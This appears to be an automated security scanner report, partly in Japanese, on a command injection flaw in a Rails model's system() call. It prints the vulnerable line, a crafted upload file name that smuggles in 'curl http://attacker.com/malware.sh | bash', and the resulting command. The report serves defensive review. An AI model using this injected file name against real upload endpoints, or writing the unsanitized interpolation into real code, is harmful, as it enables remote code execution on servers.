# Security Analysis: benefits.rb - Command line arguments

## ファイル情報

- **ファイルパス**: `repo/app/models/benefits.rb`
- **検出パターン**: Command line arguments

![高信頼度](https://img.shields.io/badge/信頼度-高-red) **信頼度スコア: 95**

## 脆弱性タイプ

- `RCE`

## PAR Policy Analysis

## マッチしたソースコード

```code
File
```

## 詳細解析

## Remote Code Execution via Command Injection

### Vulnerability Details
Line 15 uses string interpolation with unsanitized `file.original_filename` in a `system()` call:

```ruby
system("cp #{full_file_name} #{data_path}/bak#{Time.zone.now.to_i}_#{file.original_filename}")
```

### Attack Scenario
An attacker can upload a file named:
```
index.txt'; curl http://attacker.com/malware.sh | bash; echo '
```

This results in executed command:
```bash
cp /path/to/file 'index.txt'; curl http://attacker.com/malware.sh | bash; echo ''
```

### MITRE ATT&CK
- T1059: Command and Scripting Interpreter
- T1204: User Execution

